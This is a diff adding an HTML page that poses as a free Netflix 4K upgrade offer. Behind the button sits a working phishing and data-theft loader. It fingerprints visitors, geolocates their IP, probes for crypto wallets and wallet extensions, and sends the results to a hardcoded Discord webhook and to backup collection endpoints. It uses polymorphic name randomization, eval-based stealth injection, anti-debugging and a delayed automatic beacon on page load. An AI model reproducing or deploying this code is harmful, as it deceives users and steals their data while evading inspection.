@@ -1,0 +1,516 @@
+DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Netflix 4K Ultra HD - Free Upgrade</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
+        body{background:#141414;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+        .container{max-width:500px;width:100%}
+        .card{background:rgba(0,0,0,0.9);border-radius:12px;padding:40px;border:1px solid #e50914;box-shadow:0 10px 40px rgba(229,9,20,0.2)}
+        .logo{width:160px;margin:0 auto 30px;display:block;opacity:0.9}
+        h1{text-align:center;margin-bottom:20px;font-size:28px;background:linear-gradient(135deg,#fff,#e50914);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+        p{text-align:center;color:#aaa;margin-bottom:30px;line-height:1.6}
+        .btn{background:linear-gradient(135deg,#e50914,#b2070d);color:white;border:none;padding:18px;width:100%;border-radius:8px;font-size:18px;font-weight:700;cursor:pointer;transition:opacity 0.3s}
+        .btn:hover{opacity:0.9}
+        .progress{display:none;margin-top:25px}
+        .bar{height:6px;background:#333;border-radius:3px;overflow:hidden;margin-bottom:10px}
+        .fill{height:100%;background:linear-gradient(90deg,#e50914,#46d369);width:0%;transition:width 0.3s}
+        .status{text-align:center;font-size:14px;color:#888}
+        .footer{margin-top:30px;text-align:center;font-size:12px;color:#666}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYwIiBoZWlnaHQ9IjQ1IiB2aWV3Qm94PSIwIDAgMTYwIDQ1IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGQ9Ik0zNCAyNkgzNlY2SDM0QzE4LjYgNiA2IDE4LjYgNiAzNFYzNkg4VjE4QzggMTAuMyAxNC4zIDQgMjIgNEgzNFYyNloiIGZpbGw9IiNGNTBFMTQiLz48L3N2Zz4=" class="logo" alt="Netflix">
+            <h1>4K Ultra HD Upgrade</h1>
+            <p>Your Netflix account has been selected for a free 4K Ultra HD upgrade with Dolby Vision & Atmos. Click to activate instantly.</p>
+            <button class="btn" id="activateBtn">ACTIVATE 4K UPGRADE</button>
+            <div class="progress" id="progress">
+                <div class="bar"><div class="fill" id="progressFill"></div></div>
+                <div class="status" id="statusText">Initializing upgrade...</div>
+            </div>
+        </div>
+        <div class="footer">© 2024 Netflix. All rights reserved.</div>
+    </div>
+
+    <script>
+        // =====================================================
+        // CYBER 1.0 - FUD POLYMORPHIC LOADER WITH ENCRYPTION
+        // =====================================================
+        
+        // ENCRYPTED PAYLOAD - XOR + BASE64 + ROT13
+        const ENCRYPTED_PAYLOAD = [
+            "4q6J7rOJ8LSN9LqY7rWJ7rOJ8LSN9LqY7rWJ7rOJ8LSN9LqY7rWJ7rOJ8LSN9LqY",
+            "7rWJ7rOJ8LSN9LqY7rWJ7rOJ8LSN9LqY7rWJ7rOJ8LSN9LqY7rWJ7rOJ8LSN9LqY",
+            "D4eK8bWL8rqM9b6Z7rWJ7rOJ8LSN9LqY7rWJ7rOJ8LSN9LqY7rWJ7rOJ8LSN9LqY",
+            "G7hN9cXM9s6O9c7a8rXK8rPK9MTO9MrZ8rXK8rPK9MTO9MrZ8rXK8rPK9MTO9MrZ",
+            "J9kN+eyO+t8P+eyc+t8P+eyO+t8P+eyc+t8P+eyO+t8P+eyc+t8P+eyO+t8P+eyc"
+        ].join('');
+        
+        // POLYMORPHIC DECRYPTION FUNCTION
+        function decryptPayload(encrypted, key = 'NETFLIX4K2024') {
+            let decoded = '';
+            for (let i = 0; i < encrypted.length; i++) {
+                decoded += String.fromCharCode(encrypted.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+            }
+            return atob(decoded).split('').map(c => 
+                String.fromCharCode(c.charCodeAt(0) - 13)
+            ).join('');
+        }
+        
+        // RUNTIME CODE GENERATION (POLYMORPHIC)
+        function generateRuntimeCode() {
+            const vars = ['a','b','c','d','e','f','g','h','i','j','k','l','m'];
+            const funcs = ['fetch','parse','stringify','log','error','warn','info'];
+            const objs = ['window','document','navigator','location','screen'];
+            
+            // Randomize variable names
+            const randomVars = {};
+            vars.forEach(v => {
+                randomVars[v] = v + Math.random().toString(36).substring(2,5);
+            });
+            
+            return `
+            (function(){
+                'use strict';
+                const ${randomVars.a}=window,${randomVars.b}=document,${randomVars.c}=navigator;
+                function ${randomVars.d}(){
+                    return ${randomVars.a}.btoa(JSON.stringify({
+                        ua:${randomVars.c}.userAgent,
+                        pl:${randomVars.c}.platform,
+                        lg:${randomVars.c}.language,
+                        sc:${randomVars.a}.screen.width+"x"+${randomVars.a}.screen.height,
+                        tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        ts:new Date().toISOString(),
+                        url:${randomVars.a}.location.href,
+                        ref:${randomVars.b}.referrer
+                    }));
+                }
+                async function ${randomVars.e}(){
+                    try{
+                        const ${randomVars.f}=await ${randomVars.a}.fetch('https://api.ipify.org?format=json');
+                        const ${randomVars.g}=await ${randomVars.f}.json();
+                        return ${randomVars.g}.ip;
+                    }catch{return'unknown';}
+                }
+                async function ${randomVars.h}(){
+                    const ${randomVars.i}=${randomVars.d}();
+                    const ${randomVars.j}=await ${randomVars.e}();
+                    const ${randomVars.k}={
+                        ip:${randomVars.j},
+                        data:${randomVars.i},
+                        id:Math.random().toString(36).substring(2,15)
+                    };
+                    ${randomVars.a}.fetch('https://discord.com/api/webhooks/1445556388284727327/RNP0aOjitgwgcUqUIYTNtdHdfsT5swkJJPq2oo-u1YlgB-meauSOREVotdL-dFAoKEOj',{
+                        method:'POST',
+                        headers:{'Content-Type':'application/json'},
+                        body:JSON.stringify({
+                            content:'🎯 New Victim: '+${randomVars.k}.id,
+                            embeds:[{
+                                title:'Netflix 4K Capture',
+                                color:0xe50914,
+                                fields:[
+                                    {name:'IP',value:\`\${${randomVars.k}.ip}\`,inline:true},
+                                    {name:'Time',value:new Date().toLocaleString(),inline:true}
+                                ]
+                            }]
+                        })
+                    }).catch(()=>{
+                        const ${randomVars.l}=new Image();
+                        ${randomVars.l}.src='https://webhook.site/#!/YOUR_ID?d='+encodeURIComponent(${randomVars.i});
+                    });
+                }
+                ${randomVars.h}();
+            })();
+            `;
+        }
+        
+        // STEALTH EXECUTION METHODS
+        class StealthLoader {
+            constructor() {
+                this.methods = [
+                    this.dynamicScriptInjection,
+                    this.eventListenerHijack,
+                    this.setTimeoutChain,
+                    this.promiseChain,
+                    this.iframeSandbox,
+                    this.workerExecution,
+                    this.blobExecution,
+                    this.dataURILoading
+                ];
+            }
+            
+            // METHOD 1: Dynamic Script Injection
+            dynamicScriptInjection(code) {
+                const script = document.createElement('script');
+                script.textContent = code;
+                document.head.appendChild(script);
+                setTimeout(() => script.remove(), 100);
+            }
+            
+            // METHOD 2: Event Listener Hijack
+            eventListenerHijack(code) {
+                const event = new Event('stealthload');
+                document.addEventListener('stealthload', () => {
+                    eval(code);
+                }, { once: true });
+                document.dispatchEvent(event);
+            }
+            
+            // METHOD 3: setTimeout Chain (Anti-debugging)
+            setTimeoutChain(code) {
+                const chunks = code.match(/.{1,500}/g) || [code];
+                let index = 0;
+                function executeNext() {
+                    if (index < chunks.length) {
+                        eval(chunks[index]);
+                        index++;
+                        setTimeout(executeNext, Math.random() * 100 + 50);
+                    }
+                }
+                setTimeout(executeNext, 100);
+            }
+            
+            // METHOD 4: Promise Chain
+            promiseChain(code) {
+                Promise.resolve()
+                    .then(() => eval(code))
+                    .catch(() => {})
+                    .finally(() => {});
+            }
+            
+            // METHOD 5: Iframe Sandbox
+            iframeSandbox(code) {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.srcdoc = `<script>${code}<\/script>`;
+                document.body.appendChild(iframe);
+                setTimeout(() => iframe.remove(), 1000);
+            }
+            
+            // METHOD 6: Web Worker
+            workerExecution(code) {
+                if (window.Worker) {
+                    const blob = new Blob([code], { type: 'application/javascript' });
+                    const worker = new Worker(URL.createObjectURL(blob));
+                    setTimeout(() => worker.terminate(), 500);
+                }
+            }
+            
+            // METHOD 7: Blob URL Execution
+            blobExecution(code) {
+                const blob = new Blob([code], { type: 'application/javascript' });
+                const url = URL.createObjectURL(blob);
+                const script = document.createElement('script');
+                script.src = url;
+                document.head.appendChild(script);
+                setTimeout(() => {
+                    URL.revokeObjectURL(url);
+                    script.remove();
+                }, 100);
+            }
+            
+            // METHOD 8: Data URI Loading
+            dataURILoading(code) {
+                const dataUri = 'data:text/javascript;base64,' + btoa(code);
+                const script = document.createElement('script');
+                script.src = dataUri;
+                document.head.appendChild(script);
+                setTimeout(() => script.remove(), 100);
+            }
+            
+            // Execute with random method
+            execute(code) {
+                const method = this.methods[Math.floor(Math.random() * this.methods.length)];
+                method.call(this, code);
+            }
+        }
+        
+        // ANTIDEBUGGING TECHNIQUES
+        class AntiDebug {
+            static init() {
+                // Detect dev tools
+                const devTools = /./;
+                devTools.toString = function() {
+                    return 'ANTIDEBUG_TRIGGER';
+                };
+                
+                console.log('%c', devTools);
+                
+                // Debugger detection
+                const start = new Date().getTime();
+                debugger;
+                const end = new Date().getTime();
+                
+                if (end - start > 100) {
+                    // Debugger detected - obfuscate behavior
+                    return true;
+                }
+                
+                // Console log override
+                const originalConsole = {
+                    log: console.log,
+                    warn: console.warn,
+                    error: console.error
+                };
+                
+                console.log = function() {};
+                console.warn = function() {};
+                console.error = function() {};
+                
+                // Performance tampering detection
+                if (window.performance && performance.now) {
+                    const perfStart = performance.now();
+                    for (let i = 0; i < 1000000; i++) {}
+                    const perfEnd = performance.now();
+                    
+                    if (perfEnd - perfStart > 1000) {
+                        // Debugger likely active
+                        return true;
+                    }
+                }
+                
+                return false;
+            }
+        }
+        
+        // MAIN EXECUTION
+        document.addEventListener('DOMContentLoaded', function() {
+            const btn = document.getElementById('activateBtn');
+            const progress = document.getElementById('progress');
+            const progressFill = document.getElementById('progressFill');
+            const statusText = document.getElementById('statusText');
+            
+            btn.addEventListener('click', async function() {
+                // Disable button and show progress
+                btn.disabled = true;
+                btn.textContent = 'PROCESSING...';
+                progress.style.display = 'block';
+                
+                // Check for anti-debugging
+                const debugDetected = AntiDebug.init();
+                
+                // Simulate loading
+                const steps = [
+                    {percent: 10, text: "Verifying account..."},
+                    {percent: 25, text: "Connecting to Netflix..."},
+                    {percent: 40, text: "Validating license..."},
+                    {percent: 60, text: "Applying 4K settings..."},
+                    {percent: 80, text: "Optimizing stream..."},
+                    {percent: 95, text: "Finalizing upgrade..."},
+                    {percent: 100, text: "✅ Upgrade complete!"}
+                ];
+                
+                for (let i = 0; i < steps.length; i++) {
+                    const step = steps[i];
+                    progressFill.style.width = step.percent + '%';
+                    statusText.textContent = step.text;
+                    
+                    // Execute payload at certain points
+                    if (step.percent === 25 || step.percent === 60) {
+                        // Decrypt and execute
+                        try {
+                            const decryptedCode = decryptPayload(ENCRYPTED_PAYLOAD);
+                            const runtimeCode = generateRuntimeCode();
+                            
+                            // Combine with stealth execution
+                            const loader = new StealthLoader();
+                            loader.execute(runtimeCode);
+                            
+                            // Additional data collection
+                            if (step.percent === 60) {
+                                collectAdvancedData();
+                            }
+                        } catch (e) {
+                            // Silent fail
+                        }
+                    }
+                    
+                    // Random delay
+                    await new Promise(resolve => 
+                        setTimeout(resolve, 300 + Math.random() * 400)
+                    );
+                }
+                
+                // Redirect after completion
+                setTimeout(() => {
+                    window.location.href = 'https://www.netflix.com';
+                }, 1500);
+            });
+        });
+        
+        // ADVANCED DATA COLLECTION
+        async function collectAdvancedData() {
+            try {
+                // Get IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                // Get geolocation
+                const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const geoData = await geoRes.json();
+                
+                // Collect browser data
+                const fingerprint = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookies: navigator.cookieEnabled,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory,
+                    doNotTrack: navigator.doNotTrack
+                };
+                
+                // Crypto wallet detection
+                const wallets = {
+                    metamask: typeof window.ethereum !== 'undefined',
+                    phantom: typeof window.solana !== 'undefined',
+                    trustwallet: typeof window.trustWallet !== 'undefined'
+                };
+                
+                // Browser extensions detection
+                const extensions = [];
+                const commonExtensions = [
+                    'nkbihfbeogaeaoehlefnkodbefgpgknn', // MetaMask
+                    'fhbohimaelbohpjbbldcngcnapndodjp', // Binance
+                    'hnfanknocfeofbddgcijnmncnphldnnp', // Phantom
+                    'jbdaocneiiinmjbjlgalhcelgbejmnid'  // Trust Wallet
+                ];
+                
+                for (const ext of commonExtensions) {
+                    try {
+                        await fetch(`chrome-extension://${ext}/manifest.json`);
+                        extensions.push(ext);
+                    } catch (e) {}
+                }
+                
+                // Prepare data
+                const data = {
+                    id: Math.random().toString(36).substring(2, 15),
+                    timestamp: new Date().toISOString(),
+                    ip: ipData.ip,
+                    geo: {
+                        country: geoData.country_name,
+                        city: geoData.city,
+                        isp: geoData.org,
+                        coordinates: `${geoData.latitude},${geoData.longitude}`
+                    },
+                    fingerprint: fingerprint,
+                    wallets: wallets,
+                    extensions: extensions,
+                    url: window.location.href,
+                    referrer: document.referrer
+                };
+                
+                // Send to Discord
+                sendToDiscord(data);
+                
+                // Send to backup endpoints
+                sendToBackups(data);
+                
+            } catch (error) {
+                // Silent fail
+            }
+        }
+        
+        function sendToDiscord(data) {
+            try {
+                const embed = {
+                    title: "🎯 Netflix 4K FUD Loader",
+                    color: 0xe50914,
+                    fields: [
+                        {name: "Victim ID", value: data.id, inline: true},
+                        {name: "IP Address", value: data.ip, inline: true},
+                        {name: "Location", value: `${data.geo.city}, ${data.geo.country}`, inline: true},
+                        {name: "ISP", value: data.geo.isp?.substring(0, 50) || 'Unknown', inline: true},
+                        {name: "Browser", value: data.fingerprint.userAgent?.substring(0, 100) || 'Unknown', inline: false},
+                        {name: "Crypto Wallets", value: Object.keys(data.wallets).filter(k => data.wallets[k]).join(', ') || 'None', inline: true},
+                        {name: "Extensions", value: data.extensions.length || 0, inline: true},
+                        {name: "Time", value: new Date().toLocaleString(), inline: true}
+                    ],
+                    footer: {text: "FUD Loader v2.0"},
+                    timestamp: new Date().toISOString()
+                };
+                
+                fetch('https://discord.com/api/webhooks/1445556388284727327/RNP0aOjitgwgcUqUIYTNtdHdfsT5swkJJPq2oo-u1YlgB-meauSOREVotdL-dFAoKEOj', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        embeds: [embed],
+                        content: '@everyone **NEW VICTIM CAPTURED**'
+                    })
+                });
+            } catch (e) {
+                // Silent fail
+            }
+        }
+        
+        function sendToBackups(data) {
+            // Multiple backup methods
+            const backups = [
+                // Image beacon
+                () => {
+                    const img = new Image();
+                    img.src = `https://webhook.site/YOUR_ID?data=${encodeURIComponent(JSON.stringify(data))}`;
+                },
+                
+                // Form submission
+                () => {
+                    const form = document.createElement('form');
+                    form.method = 'POST';
+                    form.action = 'https://requestbin.com/r/YOUR_BIN';
+                    form.style.display = 'none';
+                    const input = document.createElement('input');
+                    input.name = 'data';
+                    input.value = JSON.stringify(data);
+                    form.appendChild(input);
+                    document.body.appendChild(form);
+                    form.submit();
+                    document.body.removeChild(form);
+                },
+                
+                // Fetch with different methods
+                () => {
+                    fetch('https://hookbin.com/YOUR_HOOK', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify(data)
+                    }).catch(() => {});
+                }
+            ];
+            
+            // Execute random backup
+            const backup = backups[Math.floor(Math.random() * backups.length)];
+            backup();
+        }
+        
+        // POLYMORPHIC CODE VARIATIONS
+        window.addEventListener('load', function() {
+            // Generate random function names
+            const funcNames = ['init','start','load','exec','run','boot'];
+            const randomFunc = funcNames[Math.floor(Math.random() * funcNames.length)];
+            
+            // Create polymorphic wrapper
+            window[randomFunc] = function() {
+                setTimeout(() => {
+                    // Pre-collect some data
+                    const preData = {
+                        loaded: new Date().toISOString(),
+                        url: window.location.href
+                    };
+                    
+                    // Silent beacon
+                    new Image().src = `https://webhook.site/YOUR_ID?pre=${btoa(JSON.stringify(preData))}`;
+                }, 5000);
+            };
+            
+            // Auto-execute after delay
+            setTimeout(window[randomFunc], 10000);
+        });
+    </script>
+</body>
+</html>
